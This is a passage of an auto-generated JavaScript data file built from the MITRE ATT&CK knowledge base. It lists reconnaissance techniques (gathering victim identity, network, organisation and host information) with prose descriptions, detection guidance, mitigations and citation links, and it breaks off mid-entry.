// Auto-generated from MITRE ATT&CK STIX v19.1 + v16.1
// enterprise-attack-19.1.json (names/descriptions/platforms/mitigations) +
// enterprise-attack-16.1.json (detection text/data sources)
const DATA = [{"tactic":"Reconnaissance","techniques":[{"id":"T1589","name":"Gather Victim Identity Information","description":"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about users could also be enumerated via other active means (i.e. Active Scanning) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames. <a href=\"https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GrimBlog UsernameEnum)</a> <a href=\"https://www.obsidiansecurity.com/blog/behind-the-breach-self-service-password-reset-azure-ad/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Obsidian SSPR Abuse 2023)</a> Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). <a href=\"https://web.archive.org/web/20230602111604/https://www.opm.gov/cybersecurity/cybersecurity-incidents/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OPM Leak)</a> <a href=\"https://www.theregister.com/2017/09/26/deloitte_leak_github_and_google/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Register Deloitte)</a> <a href=\"https://www.theregister.com/2015/02/28/uber_subpoenas_github_for_hacker_details/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Register Uber)</a> <a href=\"https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Detectify Slack Tokens)</a> <a href=\"https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/#242c479d3196\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Forbes GitHub Creds)</a> <a href=\"https://github.com/dxa4481/truffleHog\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub truffleHog)</a> <a href=\"https://github.com/michenriksen/gitrob\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Gitrob)</a> <a href=\"https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CNET Leaks)</a>\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).","detection":"Monitor for suspicious network traffic that could be indicative of probing for user information, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[{"id":"T1589.001","name":"Credentials","description":"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors. <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a> <a href=\"https://www.theregister.com/2017/09/26/deloitte_leak_github_and_google/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Register Deloitte)</a> <a href=\"https://www.theregister.com/2015/02/28/uber_subpoenas_github_for_hacker_details/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Register Uber)</a> <a href=\"https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Detectify Slack Tokens)</a> <a href=\"https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/#242c479d3196\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Forbes GitHub Creds)</a> <a href=\"https://github.com/dxa4481/truffleHog\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub truffleHog)</a> <a href=\"https://github.com/michenriksen/gitrob\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Gitrob)</a> <a href=\"https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CNET Leaks)</a> Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP). <a href=\"https://sec.okta.com/scatterswine\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Scatter Swine 2022)</a>\n\nCredential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: Search Engines, breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware. <a href=\"https://www.bleepingcomputer.com/news/security/2easy-now-a-significant-dark-web-marketplace-for-stolen-data/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer 2easy 2021)</a> <a href=\"https://www.secureworks.com/research/the-growing-threat-from-infostealers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecureWorks Infostealers 2023)</a> <a href=\"https://www.bleepingcomputer.com/news/security/dissecting-the-dark-web-supply-chain-stealer-logs-in-context/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer Stealer Logs 2023)</a>\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1589.002","name":"Email Addresses","description":"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). <a href=\"https://www.hackers-arise.com/email-scraping-and-maltego\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: HackersArise Email)</a> <a href=\"https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CNET Leaks)</a> Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. <a href=\"https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GrimBlog UsernameEnum)</a> For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType. <a href=\"https://github.com/gremwell/o365enum\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Office 365 User Enumeration)</a> <a href=\"https://o365blog.com/post/just-looking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Active Directory Reconnaisance)</a>\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).","detection":"Monitor for suspicious network traffic that could be indicative of probing for email addresses and/or usernames, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1589.003","name":"Employee Names","description":"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). <a href=\"https://web.archive.org/web/20230602111604/https://www.opm.gov/cybersecurity/cybersecurity-incidents/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OPM Leak)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]}]},{"id":"T1590","name":"Gather Victim Network Information","description":"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). <a href=\"https://www.whois.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WHOIS)</a> <a href=\"https://dnsdumpster.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Dumpster)</a> <a href=\"https://www.circl.lu/services/passive-dns/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Circl Passive DNS)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[{"id":"T1590.001","name":"Domain Properties","description":"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS). <a href=\"https://www.whois.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WHOIS)</a> <a href=\"https://dnsdumpster.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Dumpster)</a> <a href=\"https://www.circl.lu/services/passive-dns/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Circl Passive DNS)</a> Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments. <a href=\"https://o365blog.com/post/just-looking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Active Directory Reconnaisance)</a> <a href=\"https://docs.microsoft.com/en-us/archive/blogs/tip_of_the_day/cloud-tip-of-the-day-advanced-way-to-check-domain-availability-for-office-365-and-azure\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Office 265 Azure Domain Availability)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1590.002","name":"DNS","description":"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk. <a href=\"https://x.com/PyroTek3/status/1126487227712921600\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sean Metcalf Twitter DNS Records)</a>\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). <a href=\"https://dnsdumpster.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Dumpster)</a> <a href=\"https://www.circl.lu/services/passive-dns/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Circl Passive DNS)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).\n\nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server. <a href=\"https://web.archive.org/web/20180615055527/https://securitytrails.com/blog/russian-tlds\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trails-DNS)</a> <a href=\"https://www.cisa.gov/news-events/alerts/2015/04/13/dns-zone-transfer-axfr-requests-may-leak-domain-information\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS-CISA)</a> <a href=\"https://en.internetwache.org/scanning-alexas-top-1m-for-axfr-29-03-2015/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Alexa-dns)</a>","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1054","name":"Software Configuration","description":"Consider implementing policies for DNS servers, such as Zone Transfer Policies, that enforce a list of validated servers permitted for zone transfers. <a href=\"https://learn.microsoft.com/en-us/windows-server/networking/dns/deploy/dns-policies-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS-msft)</a>"}]},{"id":"T1590.003","name":"Network Trust Dependencies","description":"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). <a href=\"https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory-forests-rooted2019\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentesting AD Forests)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1590.004","name":"Network Topology","description":"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). <a href=\"https://dnsdumpster.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Dumpster)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1590.005","name":"IP Addresses","description":"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). <a href=\"https://www.whois.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WHOIS)</a> <a href=\"https://dnsdumpster.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Dumpster)</a> <a href=\"https://www.circl.lu/services/passive-dns/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Circl Passive DNS)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1590.006","name":"Network Security Appliances","description":"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. <a href=\"https://nmap.org/book/firewalls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nmap Firewalls NIDS)</a> Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]}]},{"id":"T1591","name":"Gather Victim Org Information","description":"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). <a href=\"https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatPost Broadvoice Leak)</a> <a href=\"https://www.sec.gov/edgar/search-and-access\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SEC EDGAR Search)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[{"id":"T1591.001","name":"Determine Physical Locations","description":"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites or Social Media). <a href=\"https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatPost Broadvoice Leak)</a> <a href=\"https://www.sec.gov/edgar/search-and-access\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SEC EDGAR Search)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Phishing or Hardware Additions).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1591.002","name":"Business Relationships","description":"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). <a href=\"https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatPost Broadvoice Leak)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1591.003","name":"Identify Business Tempo","description":"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). <a href=\"https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatPost Broadvoice Leak)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1591.004","name":"Identify Roles","description":"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). <a href=\"https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatPost Broadvoice Leak)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]}]},{"id":"T1592","name":"Gather Victim Host Information","description":"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a> Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).\n\nAdversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary’s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others. <a href=\"https://www.trellix.com/blogs/research/qakbot-evolves-to-onenote-malware-distribution/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrellixQakbot)</a>","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect host information from visitors. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" 